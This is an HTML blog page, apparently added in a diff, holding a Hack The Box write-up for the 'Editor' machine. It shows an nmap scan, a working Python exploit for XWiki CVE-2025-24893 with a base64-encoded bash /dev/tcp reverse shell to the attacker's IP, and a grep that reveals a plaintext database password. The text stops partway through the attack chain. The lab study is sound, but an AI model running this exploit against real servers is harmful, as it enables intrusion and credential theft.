@@ -1,0 +1,911 @@
+<!doctype html>
+<html lang="en" data-accent="moss" data-f-ga4="G-ZMH6NLL7C7">
+<head>
+<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" /><script>try{var t=localStorage.getItem("facet-theme");if(/^(dark|light|auto)$/.test(t))document.documentElement.dataset.theme=t}catch(e){}</script>
+	<meta name="description" content="Hack The Box - Editor" />
+	<meta name="author" content="Shengtuo Hu" />
+	<meta name="theme-color" content="#13161c" media="(prefers-color-scheme: dark)" />
+	<meta name="theme-color" content="#f5f7f9" media="(prefers-color-scheme: light)" />
+	<title>Editor - nu1lptr</title>
+	<link rel="canonical" href="https://shengtuo.me/blog/htb/editor/" /><link rel="icon" href="https://shengtuo.me/favicon.ico" sizes="32x32" />
+	<link rel="icon" href="https://shengtuo.me/favicon.svg" type="image/svg+xml" />
+	<link rel="apple-touch-icon" href="https://shengtuo.me/apple-touch-icon.png" />
+	<link rel="alternate" type="application/rss+xml" title="nu1lptr - RSS Feed" href="https://shengtuo.me/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="nu1lptr - Atom Feed" href="https://shengtuo.me/atom.xml" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/facet.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/cast/cast-layered.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/icons.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/giallo.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/css/site.css" />
+
+	<meta property="og:site_name" content="nu1lptr" /><meta property="og:title" content="Editor" />
+	<meta property="og:url" content="https://shengtuo.me/blog/htb/editor/" />
+	<meta property="og:description" content="Hack The Box - Editor" />
+	<meta property="og:image" content="https://shengtuo.me/cards/blog/htb/editor.png" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="article:published_time" content="2026-04-06T17:00:00-07:00" />
+	<meta property="article:author" content="Shengtuo Hu" />
+	<meta property="article:tag" content="HackTheBox" /><meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="Editor" />
+	<meta name="twitter:description" content="Hack The Box - Editor" />
+	<meta name="twitter:image" content="https://shengtuo.me/cards/blog/htb/editor.png" />
+	<meta name="twitter:site" content="@ShengtuoHu" />
+	<meta name="twitter:creator" content="@ShengtuoHu" /><script type="application/ld+json">
+{
+	"@context": "https://schema.org",
+	"@type": "BlogPosting",
+	"@id": "https://shengtuo.me/blog/htb/editor/#article",
+	"mainEntityOfPage": "https://shengtuo.me/blog/htb/editor/",
+	"url": "https://shengtuo.me/blog/htb/editor/",
+	"headline": "Editor",
+	"description": "Hack The Box - Editor",
+	"datePublished": "2026-04-06T17:00:00-07:00",
+	"dateModified": "2026-04-06T17:00:00-07:00",
+	"image": "https://shengtuo.me/cards/blog/htb/editor.png",
+	"keywords": ["HackTheBox"],
+	"inLanguage": "en",
+	"author": {
+		"@type": "Person",
+		"@id": "https://shengtuo.me/#person",
+		"name": "Shengtuo Hu",
+		"url": "https://shengtuo.me/"
+	},
+	"publisher": { "@id": "https://shengtuo.me/#person" }
+}
+</script>
+
+
+
+</head>
+<body>
+  <a class="f-visually-hidden" href="#main">Skip to content</a>
+  <nav class="f-nav f-nav--fixed" aria-label="Site">
+  <a class="f-nav__brand" href="https://shengtuo.me">nu1lptr</a>
+  <a href="https://shengtuo.me/blog/" aria-current="page">Blog</a>
+  <a href="https://shengtuo.me/projects/">Projects</a>
+  <a href="https://shengtuo.me/resume/">Resume</a>
+  <button class="f-btn f-btn--quiet site-search-open" type="button" aria-label="Search" title="Search (/)" hidden>
+    <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg>
+  </button>
+  <button class="f-theme-toggle" type="button" data-f-theme-toggle>Auto</button>
+</nav>
+
+  
+<main id="main" class="f-docs f-prose" data-f-code-ln="true" data-f-code-wrap="true" data-f-code-frame="false">
+  <nav class="f-toc" aria-label="On this page" data-f-scrollspy>
+  <p class="f-docs__label">On this page</p>
+  <a href="#port-scanning">Port Scanning</a>
+  <a href="#shell-as-xwiki">Shell as xwiki</a>
+  <a href="#shell-as-oliver">Shell as oliver</a>
+  <a href="#shell-as-root">Shell as root</a>
+</nav>
+
+  <article class="site-post">
+<header class="f-reading__title">
+  <p class="f-kicker"><a href="https://shengtuo.me/blog/">nu1lptr&#39;s Blog</a></p>
+  <h1>Editor</h1>
+  <p class="f-meta site-post-meta">
+    <time datetime="2026-04-06">Apr 6, 2026</time> · 1 min read · <a href="https://shengtuo.me/tags/hackthebox/">HackTheBox</a> · <button class="f-btn f-btn--quiet site-share" type="button">Share</button><span class="site-share-status" role="status"></span>
+  </p>
+</header>
+
+    <ul>
+<li>Editor (Easy): <a rel="noopener external" target="_blank" href="https://www.hackthebox.com/machines/Editor">https://www.hackthebox.com/machines/Editor</a></li>
+<li>My notes: <a rel="noopener external" target="_blank" href="https://github.com/h1994st/HTB/blob/main/Editor.ipynb">https://github.com/h1994st/HTB/blob/main/Editor.ipynb</a></li>
+</ul>
+<h2 id="port-scanning"><a class="zola-anchor" href="#port-scanning" aria-label="Link to this section">#</a>
+Port Scanning</h2>
+<p>Add the mapping from <code>10.129.231.23</code> to <code>editor.htb</code> in <code>/etc/hosts</code></p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-1 z-i"># TCP scanning</span></span>
+<span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A</span><span class="z-10"> 10.129.231.23</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span>TARGET_IP</span><span class="z-3"> = &quot;</span><span class="z-6">10.129.231.23</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>TARGET_HOST</span><span class="z-3"> = &quot;</span><span class="z-6">editor.htb</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>OUTPUT_DIR</span><span class="z-3"> =</span><span> TARGET_HOST</span></span>
+<span class="giallo-l"><span>CREDENTIALS</span><span class="z-3">:</span><span> dict</span><span class="z-3">[</span><span class="z-12">str</span><span class="z-3">,</span><span class="z-12"> str</span><span class="z-3">] = {}</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">from</span><span> common</span><span class="z-3 z-i"> import</span><span> scan_ports</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-2">print</span><span class="z-3">(&quot;</span><span class="z-6">Scanning TCP ports for IP:</span><span class="z-3">&quot;,</span><span class="z-2"> TARGET_HOST</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-2">scan_ports</span><span class="z-3">(</span><span class="z-2">TARGET_HOST</span><span class="z-3">,</span><span class=" z-i"> top_ports</span><span class="z-3">=</span><span class="z-10">1000</span><span class="z-3">)</span></span></code></pre>
+<p>Scanning output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>Scanning TCP ports for IP: editor.htb</span></span>
+<span class="giallo-l"><span>Nmap is installed.</span></span>
+<span class="giallo-l"><span>Ports:</span></span>
+<span class="giallo-l"><span>{&#39;protocol&#39;: &#39;tcp&#39;, &#39;portid&#39;: &#39;22&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;ssh&#39;, &#39;product&#39;: &#39;OpenSSH&#39;, &#39;version&#39;: &#39;8.9p1 Ubuntu 3ubuntu0.13&#39;, &#39;extrainfo&#39;: &#39;Ubuntu Linux; protocol 2.0&#39;, &#39;ostype&#39;: &#39;Linux&#39;, &#39;method&#39;: &#39;probed&#39;, &#39;conf&#39;: &#39;10&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;ssh-hostkey&#39;, &#39;output&#39;: &#39;\n  256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=\n  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;protocol&#39;: &#39;tcp&#39;, &#39;portid&#39;: &#39;80&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;http&#39;, &#39;product&#39;: &#39;nginx&#39;, &#39;version&#39;: &#39;1.18.0&#39;, &#39;extrainfo&#39;: &#39;Ubuntu&#39;, &#39;ostype&#39;: &#39;Linux&#39;, &#39;method&#39;: &#39;probed&#39;, &#39;conf&#39;: &#39;10&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-server-header&#39;, &#39;output&#39;: &#39;nginx/1.18.0 (Ubuntu)&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-methods&#39;, &#39;output&#39;: &#39;\n  Supported Methods: GET HEAD&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-title&#39;, &#39;output&#39;: &#39;Editor - SimplistCode Pro&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;protocol&#39;: &#39;tcp&#39;, &#39;portid&#39;: &#39;8080&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;http&#39;, &#39;product&#39;: &#39;Jetty&#39;, &#39;version&#39;: &#39;10.0.20&#39;, &#39;method&#39;: &#39;probed&#39;, &#39;conf&#39;: &#39;10&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-server-header&#39;, &#39;output&#39;: &#39;Jetty(10.0.20)&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-cookie-flags&#39;, &#39;output&#39;: &#39;\n  /: \n    JSESSIONID: \n      httponly flag not set&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-open-proxy&#39;, &#39;output&#39;: &#39;Proxy might be redirecting requests&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-webdav-scan&#39;, &#39;output&#39;: &#39;\n  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK\n  Server Type: Jetty(10.0.20)\n  WebDAV type: Unknown&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-robots.txt&#39;, &#39;output&#39;: &#39;50 disallowed entries (40 shown)\n/xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ \n/xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ \n/xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ \n/xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ \n/xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ \n/xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ \n/xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ \n/xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ \n/xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ \n/xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ \n/xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ \n/xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ \n/xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ \n/xwiki/bin/logout/&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-methods&#39;, &#39;output&#39;: &#39;\n  Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK\n  Potentially risky methods: PROPFIND LOCK UNLOCK&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;id&#39;: &#39;http-title&#39;, &#39;output&#39;: &#39;XWiki - Main - Intro\nRequested resource was http://editor.htb:8080/xwiki/bin/view/Main/&#39;}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>OS Matches:</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;Linux 4.15 - 5.19&#39;, &#39;accuracy&#39;: &#39;100&#39;, &#39;line&#39;: &#39;70534&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)&#39;, &#39;accuracy&#39;: &#39;100&#39;, &#39;line&#39;: &#39;91792&#39;}</span></span></code></pre>
+<p>From nmap scanning results, we can know</p>
+<table><thead><tr><th>Port</th><th>Service</th><th>Notes</th></tr></thead><tbody>
+<tr><td>22</td><td>SSH (OpenSSH 8.9p1)</td><td>Ubuntu Linux</td></tr>
+<tr><td>80</td><td>HTTP (nginx 1.18.0)</td><td>"Editor - SimplistCode Pro"</td></tr>
+<tr><td>8080</td><td>HTTP (Jetty 10.0.20)</td><td>XWiki instance; WebDAV enabled (PROPFIND, LOCK, UNLOCK); JSESSIONID cookie without httponly flag; 50 disallowed entries in robots.txt under <code>/xwiki/bin/</code></td></tr>
+</tbody></table>
+<h2 id="shell-as-xwiki"><a class="zola-anchor" href="#shell-as-xwiki" aria-label="Link to this section">#</a>
+Shell as <code>xwiki</code></h2>
+<p>Exploit <code>CVE-2025-24893</code></p>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://www.exploit-db.com/exploits/52136">https://www.exploit-db.com/exploits/52136</a></li>
+<li><a rel="noopener external" target="_blank" href="https://www.offsec.com/blog/cve-2025-24893/">https://www.offsec.com/blog/cve-2025-24893/</a></li>
+</ul>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> base64</span></span>
+<span class="giallo-l"><span class="z-3 z-i">import</span><span> re</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">import</span><span> aiohttp</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> common</span><span class="z-3 z-i"> import</span><span> get_openvpn_utun_ip</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>XWIKI_HOST</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;wiki.</span><span class="z-10">{</span><span>TARGET_HOST</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"><span>XWIKI_BASE_URL</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;http://</span><span class="z-10">{</span><span>XWIKI_HOST</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>OUTPUT_PATTERN</span><span class="z-3"> =</span><span> re</span><span class="z-3">.</span><span class="z-2">compile</span><span class="z-3">(</span><span class="z-7">r</span><span class="z-3">&quot;</span><span class="z-6">RSS feed for search on </span><span>\[</span><span class="z-3">(</span><span class="z-9">?P&lt;output&gt;</span><span class="z-6">.</span><span class="z-3">*?)</span><span>\]</span><span class="z-6">&amp;lt;/title&amp;gt</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> run_command</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span><span class=" z-i"> command_str</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span><span class=" z-i"> timeout</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3"> =</span><span class="z-10"> 2</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span class="z-12"> str</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    params</span><span class="z-3">:</span><span> dict</span><span class="z-3">[</span><span class="z-12">str</span><span class="z-3">,</span><span class="z-12"> str</span><span class="z-3">] = {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">media</span><span class="z-3">&quot;: &quot;</span><span class="z-6">rss</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">text</span><span class="z-3">&quot;: &quot;</span><span class="z-10">{{</span><span class="z-6">async async=false</span><span class="z-10">}}{{</span><span class="z-6">groovy</span><span class="z-10">}}</span><span class="z-6">println([</span><span class="z-10">%s</span><span class="z-6">].execute().text)</span><span class="z-10">{{</span><span class="z-6">/groovy</span><span class="z-10">}}{{</span><span class="z-6">/async</span><span class="z-10">}}</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">        %</span><span> command_str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    async with</span><span> session</span><span class="z-3">.</span><span class="z-2">get</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">/xwiki/bin/get/Main/SolrSearch</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class=" z-i">        params</span><span class="z-3">=</span><span class="z-2">params</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">        raise_for_status</span><span class="z-3">=True,</span></span>
+<span class="giallo-l"><span class=" z-i">        timeout</span><span class="z-3">=</span><span class="z-2">aiohttp</span><span class="z-3">.</span><span class="z-2">ClientTimeout</span><span class="z-3">(</span><span class=" z-i">total</span><span class="z-3">=</span><span class="z-2">timeout</span><span class="z-3">),</span></span>
+<span class="giallo-l"><span class="z-3">    )</span><span class="z-3 z-i"> as</span><span> response</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>        text</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> response</span><span class="z-3">.</span><span class="z-2">text</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>        match</span><span class="z-3"> =</span><span> OUTPUT_PATTERN</span><span class="z-3">.</span><span class="z-2">search</span><span class="z-3">(</span><span class="z-2">text</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> match</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>            output</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3"> =</span><span> match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&quot;</span><span class="z-6">output</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>            output</span><span class="z-3"> =</span><span> output</span><span class="z-3">.</span><span class="z-2">replace</span><span class="z-3">(&quot;</span><span class="z-6">&lt;br/&gt;</span><span class="z-3">&quot;, &quot;</span><span>\n</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            return</span><span> output</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">Command output not found in response</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> run_command_args</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span><span class=" z-i"> args</span><span class="z-3">:</span><span> list</span><span class="z-3">[</span><span class="z-12">str</span><span class="z-3">],</span><span class=" z-i"> timeout</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3"> =</span><span class="z-10"> 2</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span class="z-12"> str</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    command</span><span class="z-3"> = &quot;</span><span class="z-6">, </span><span class="z-3">&quot;.</span><span class="z-2">join</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&#39;&quot;</span><span class="z-10">{</span><span class="z-2">arg</span><span class="z-10">}</span><span class="z-6">&quot;&#39;</span><span class="z-3 z-i"> for</span><span class="z-2"> arg</span><span class="z-3 z-i"> in</span><span class="z-2"> args</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    return await</span><span class="z-2"> run_command</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> command</span><span class="z-3">,</span><span class=" z-i"> timeout</span><span class="z-3">=</span><span class="z-2">timeout</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> exploit_xwiki</span><span class="z-3">():</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    async with</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">ClientSession</span><span class="z-3">(</span><span class=" z-i">base_url</span><span class="z-3">=</span><span class="z-2">XWIKI_BASE_URL</span><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> session</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">[*] Running command:</span><span class="z-3">&quot;, &quot;</span><span class="z-6">id</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>        result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> run_command_args</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">, [&quot;</span><span class="z-6">id</span><span class="z-3">&quot;])</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">[+] Command output:</span><span class="z-3">&quot;,</span><span class="z-2"> result</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">[*] Running command:</span><span class="z-3">&quot;, &quot;</span><span class="z-6">whoami</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>        result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> run_command_args</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">, [&quot;</span><span class="z-6">whoami</span><span class="z-3">&quot;])</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">[+] Command output:</span><span class="z-3">&quot;,</span><span class="z-2"> result</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Get a reverse shell</span></span>
+<span class="giallo-l"><span>        lhost</span><span class="z-3"> =</span><span class="z-2"> get_openvpn_utun_ip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>        lport</span><span class="z-3"> =</span><span class="z-10"> 443</span></span>
+<span class="giallo-l"><span>        command</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;bash -i &gt;&amp; /dev/tcp/</span><span class="z-10">{</span><span>lhost</span><span class="z-10">}</span><span class="z-6">/</span><span class="z-10">{</span><span>lport</span><span class="z-10">}</span><span class="z-6"> 0&gt;&amp;1&quot;</span></span>
+<span class="giallo-l"><span>        encoded_command</span><span class="z-3"> =</span><span> base64</span><span class="z-3">.</span><span class="z-2">b64encode</span><span class="z-3">(</span><span class="z-2">command</span><span class="z-3">.</span><span class="z-2">encode</span><span class="z-3">()).</span><span class="z-2">decode</span><span class="z-3">()</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">        try</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(&quot;</span><span class="z-6">[*] Running command:</span><span class="z-3">&quot;,</span><span class="z-2"> command</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>            result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> run_command_args</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">                session</span><span class="z-3">, [&quot;</span><span class="z-6">bash</span><span class="z-3">&quot;, &quot;</span><span class="z-6">-c</span><span class="z-3">&quot;,</span><span class="z-7"> f</span><span class="z-6">&quot;echo </span><span class="z-10">{</span><span class="z-2">encoded_command</span><span class="z-10">}</span><span class="z-6"> | base64 -d | bash&quot;</span><span class="z-3">]</span></span>
+<span class="giallo-l"><span class="z-3">            )</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(&quot;</span><span class="z-6">[+] Command output:</span><span class="z-3">&quot;,</span><span class="z-2"> result</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        except</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientResponseError</span><span class="z-3 z-i"> as</span><span> e</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            assert</span><span> e</span><span class="z-3">.</span><span class="z-9">status</span><span class="z-3"> ==</span><span class="z-10"> 504</span><span class="z-3">,</span><span class="z-7"> f</span><span class="z-6">&quot;Unexpected error status: </span><span class="z-10">{</span><span>e</span><span class="z-3">.</span><span class="z-9">status</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(&quot;</span><span class="z-6">[*] Expected gateway timeout error due to reverse shell:</span><span class="z-3">&quot;,</span><span class="z-2"> e</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        except</span><span class="z-12"> TimeoutError</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(&quot;</span><span class="z-6">[*] Expected timeout error due to reverse shell</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">await</span><span class="z-2"> exploit_xwiki</span><span class="z-3">()</span></span></code></pre>
+<p>Output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>[*] Running command: id</span></span>
+<span class="giallo-l"><span>[+] Command output: uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)</span></span>
+<span class="giallo-l"><span>[*] Running command: whoami</span></span>
+<span class="giallo-l"><span>[+] Command output: xwiki</span></span>
+<span class="giallo-l"><span>[+] Found OpenVPN process with PID: 46106</span></span>
+<span class="giallo-l"><span>[+] Found OpenVPN utun interface: utun7 with IP: 10.10.15.30</span></span>
+<span class="giallo-l"><span>[*] Running command: bash -i &gt;&amp; /dev/tcp/10.10.15.30/443 0&gt;&amp;1</span></span>
+<span class="giallo-l"><span>[*] Expected timeout error due to reverse shell</span></span></code></pre><h2 id="shell-as-oliver"><a class="zola-anchor" href="#shell-as-oliver" aria-label="Link to this section">#</a>
+Shell as <code>oliver</code></h2>
+<p>Within the reverse shell, we act as <code>xwiki</code>. After searching under <code>/etc/xwiki</code> directory, we find something interesting</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">$</span><span class="z-6"> grep -C</span><span class="z-10"> 5</span><span class="z-6"> -rni password .</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-99-</span><span class="z-6">         If you want the main wiki database to be different than</span><span class="z-3"> &quot;</span><span class="z-6">xwiki</span><span class="z-3">&quot;</span><span> (or</span><span class="z-6"> the default schema for schema based</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-100-</span><span class="z-6">         engines</span><span>) you will also have to set the property xwiki.db in xwiki.cfg file</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-101-</span><span class="z-6">    --</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-102-</span><span class="z-3">    &lt;</span><span class="z-6">property name=</span><span class="z-3">&quot;</span><span class="z-6">hibernate.connection.url</span><span class="z-3">&quot;&gt;</span><span class="z-6">jdbc:mysql://localhost/xwiki?useSSL=</span><span class="z-3">false&amp;</span><span class="z-12">amp</span><span class="z-3">;</span><span>connectionTimeZone</span><span class="z-3">=</span><span class="z-6">LOCAL</span><span class="z-3">&amp;</span><span class="z-12">amp</span><span class="z-3">;</span><span>allowPublicKeyRetrieval</span><span class="z-3">=</span><span class="z-6">true</span><span class="z-3">&lt;</span><span class="z-6">/property</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-103-</span><span class="z-3">    &lt;</span><span class="z-6">property name=</span><span class="z-3">&quot;</span><span class="z-6">hibernate.connection.username</span><span class="z-3">&quot;&gt;</span><span class="z-6">xwiki</span><span class="z-3">&lt;</span><span class="z-6">/propert</span><span>y</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml:104:</span><span class="z-3">    &lt;</span><span class="z-6">property name=</span><span class="z-3">&quot;</span><span class="z-6">hibernate.connection.password</span><span class="z-3">&quot;&gt;</span><span class="z-6">theEd1t0rTeam99</span><span class="z-3">&lt;</span><span class="z-6">/propert</span><span>y</span><span class="z-3">&gt;</span></span>
